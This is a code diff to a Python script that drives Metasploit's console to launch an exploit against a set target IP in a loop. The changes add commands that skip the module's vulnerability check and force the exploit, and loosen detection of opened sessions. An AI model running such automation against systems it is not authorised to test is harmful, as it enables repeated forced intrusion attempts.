@@ -26,7 +26,7 @@ string_boot = "Metasploit tip:"
 # Metasploit failed exploiting when this string pops up
 string_bad_exploit = "but no session"
 # Metasploit succesfully started an exploit when this string pops up
-string_exploit = "Meterpreter session 1	opened"
+string_exploit = "opened"
 
 
 def openMetasploit():
@@ -53,14 +53,21 @@ def setupExploit():
 	# Set target IP
 	msfconsole.stdin.write("set RHOSTS " + ip + "\n")
 	time.sleep(delay_cmd)
+	# Set exploit not to scan
+	msfconsole.stdin.write("set CheckModule \"\"\n")
+	time.sleep(delay_cmd)
+	# Set ForceExploit
+	msfconsole.stdin.write("set ForceExploit true\n")
+	time.sleep(delay_cmd)
 
 def runExploit():
 	msfconsole.stdin.write("exploit\n")
-	output = msfconsole.stdout.readline()
+	output = ""
 	while output.find(string_bad_exploit) == -1 and output.find(string_exploit) == -1:
 		output = msfconsole.stdout.readline()
 	time.sleep(1)
-	if output.find(string_bad_exploit) == -1:
+	# If a meterpreter session has opened, we need to close it before continuing 
+	if output.find(string_exploit) != -1:
 		msfconsole.stdin.write("exit\n")
 	time.sleep(1)
 
